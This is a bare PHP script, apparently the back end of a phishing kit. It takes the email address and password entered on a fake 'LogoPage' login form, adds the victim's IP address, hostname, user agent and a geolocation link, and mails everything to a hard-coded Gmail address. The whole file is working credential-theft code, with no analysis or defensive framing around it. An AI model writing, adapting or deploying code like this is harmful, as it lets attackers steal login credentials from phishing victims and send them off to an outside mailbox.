<?php

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------LogoPage Info-----------------------\n";
$message .= "Email Address            : ".$_POST['email']."\n";
$message .= "Password           : ".$_POST['password']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
$send = "barrdionusman@gmail.com";
$subject = "LogoPage | $ip";
{
mail("$send", "$subject", $message);   
}


?>  
